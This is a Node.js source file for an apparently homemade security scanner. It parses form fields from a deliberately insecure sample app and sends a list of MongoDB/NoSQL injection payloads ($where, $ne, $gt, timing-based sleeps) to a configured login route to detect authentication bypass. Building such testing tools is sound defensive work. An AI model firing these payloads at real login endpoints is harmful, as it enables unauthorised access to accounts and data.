const fs = require('fs');
var htmlparser = require("htmlparser");
const { send } = require('process');
var select = require('soupselect').select;
var config = require('../config').config;

class Scanner {

    /*
    * Based on the given route, attempt an attak to sucessfully login
    */ 
    loginAttack(route) {
        
    }
    
    findAttackVectors(){

        // Look at the 'views' directory
        fs.readFile(__dirname  + '/../unsecure-app/views/index.ejs', 'utf8', function(err, data){

            if(err){
                throw err;
            }
            console.log(data);

           let scanner = new Scanner();
           scanner.scan(data);

        });
    }

    scanRemote(){
        
        let fuzzTests = [
            `true, $where: '1 == 1'`,
            `, $where: '1 == 1'`,
            `$where: '1 == 1'`,
            `', $where: '1 == 1'`,
            `1, $where: '1 == 1'`,
            `{ $ne: 1 }`,
            `', $or: [ {}, { 'a':'a`,
            `' } ], $comment:'successful MongoDB injection'`,
            `db.injection.insert({success:1});`,
            `db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1`,
            `|| 1==1`,
            `' || 'a'=='a`,
            `' && this.password.match(/.*/)//+%00`,
            `' && this.passwordzz.match(/.*/)//+%00`,
            `'%20%26%26%20this.password.match(/.*/)//+%00`,
            `'%20%26%26%20this.passwordzz.match(/.*/)//+%00`,
            `{$gt: ''}`,
            `{"$gt": ""}`,
            `[$ne]=1`,
            `';sleep(5000);`,
            `';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);`,
            `{$nin: [""]}}`
        ];

        let results = [];
        // Fuzz Test!
        for(let i=0; i<fuzzTests.length; i++){
            console.log("Running test: " + fuzzTests[i]);
            results.push(this.sendScan(fuzzTests[i]));
        }
        return Promise.all(results);

    }

    sendScan(fuzz){
        
        var request = require('request');

//        console.log('http://'+config['app-url'] + "/" + config.routes.login.url);

        var clientServerOptions = {
            // Need to update config to make this a loop of routes to test
            uri: 'http://'+config['app-url'] + "/" + config.routes.login.url,
            body: JSON.stringify({
                username: fuzz,
                password: fuzz
            }),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }

        return new Promise((resolve, reject) => {
            request(clientServerOptions, function (error, response) {
            
                //console.log("here");
                //console.log("checking: " + config.routes.login.successContent);
                if(response.body.includes(config.routes.login.successContent)){
                    resolve({
                        success: true,
                        fuzz: fuzz
                    });
                    return;
                }
                
                resolve({
                    success: false,
                    fuzz: fuzz
                });
            }); 
        });

    }

    scan(data){

        let handler = new htmlparser.DefaultHandler(function(error, dom){

        if(error){
            throw error;
        }

            console.log("Testing inputs);");
            // Find the attack vectors
            var attackVectors = {
                inputs: select(dom, 'input[type=text]'),
                textareas: select(dom, 'textarea'),
                hiddens: select(dom, 'input[type=hidden]'),
                radios: select(dom, 'input[type=radio]'),
                selects: select(dom, 'input[type=select]'),
                checkboxes: select(dom, 'input[type=checkbox]')
            }


            // Make this look at a website???

            console.log(attackVectors);
            console.log("")

        });

        var parser = new htmlparser.Parser(handler);
        parser.parseComplete(data);
    }

    getFieldName(field){

        if(field.attribs.name){
            return field.attribs.name;   
        }

        return null;
        
    }

}

module.exports = {
    Scanner: Scanner
}